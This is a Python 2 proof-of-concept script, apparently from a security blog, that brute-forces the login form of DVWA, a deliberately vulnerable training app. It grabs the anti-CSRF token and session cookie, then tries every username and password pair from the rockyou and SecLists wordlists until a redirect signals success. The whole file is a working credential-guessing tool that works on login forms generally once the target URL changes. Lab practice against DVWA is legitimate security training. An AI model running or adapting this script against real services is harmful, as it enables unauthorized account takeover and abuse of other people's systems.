#!/usr/bin/python
# Quick PoC template for HTTP POST form brute force, with anti-CRSF token
# Target: DVWA v1.10
#   Date: 2015-10-19
# Author: g0tmi1k ~ https://blog.g0tmi1k.com/
# Source: https://blog.g0tmi1k.com/dvwa/login/

import requests
import sys
import re
from BeautifulSoup import BeautifulSoup


# Variables
target = 'http://192.168.1.33/DVWA'
user_list = '/usr/share/seclists/Usernames/top_shortlist.txt'
pass_list = '/usr/share/seclists/Passwords/rockyou.txt'


# Value to look for in response header (Whitelisting)
success = 'index.php'


# Get the anti-CSRF token
def csrf_token():
    try:
        # Make the request to the URL
        print "\n[i] URL: %s/login.php" % target
        r = requests.get("{0}/login.php".format(target), allow_redirects=False)

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print "\n[!] csrf_token: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target)
        sys.exit(-1)

    # Extract anti-CSRF token
    soup = BeautifulSoup(r.text)
    user_token = soup("input", {"name": "user_token"})[0]["value"]
    print "[i] user_token: %s" % user_token

    # Extract session information
    session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
    session_id = session_id.group(1)
    print "[i] session_id: %s\n" % session_id

    return session_id, user_token


# Make the request to-do the brute force
def url_request(username, password, session_id, user_token):
    # POST data
    data = {
        "username": username,
        "password": password,
        "user_token": user_token,
        "Login": "Login"
    }

    # Cookie data
    cookie = {
        "PHPSESSID": session_id
    }

    try:
        # Make the request to the URL
        #print "\n[i] URL: %s/vulnerabilities/brute/" % target
        #print "[i] Data: %s" % data
        #print "[i] Cookie: %s" % cookie
        r = requests.post("{0}/login.php".format(target), data=data, cookies=cookie, allow_redirects=False)

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print "\n\n[!] url_request: Failed to connect (URL: %s/vulnerabilities/brute/).\n[i] Quitting." % (target)
        sys.exit(-1)

    # Wasn't it a redirect?
    if r.status_code != 301 and r.status_code != 302:
        # Feedback for the user (there was an error again) & Stop execution of our request
        print "\n\n[!] url_request: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code)
        sys.exit(-1)

    # We have what we need
    return r.headers["Location"]


# Main brute force loop
def brute_force(user_token, session_id):
    # Load in wordlists files
    with open(pass_list) as password:
        password = password.readlines()
    with open(user_list) as username:
        username = username.readlines()

    # Counter
    i = 0

    # Loop around
    for PASS in password:
        for USER in username:
            USER = USER.rstrip('\n')
            PASS = PASS.rstrip('\n')

            # Increase counter
            i += 1

            # Feedback for the user
            print ("[i] Try %s: %s // %s" % (i, USER, PASS))

            # Fresh CSRF token each time?
            #user_token, session_id = csrf_token()

            # Make request
            attempt = url_request(USER, PASS, session_id, user_token)
            #print attempt

            # Check response
            if attempt == success:
                print ("\n\n[i] Found!")
                print "[i] Username: %s" % (USER)
                print "[i] Password: %s" % (PASS)
                return True
    return False


# Get initial CSRF token
session_id, user_token = csrf_token()


# Start brute forcing
brute_force(user_token, session_id)
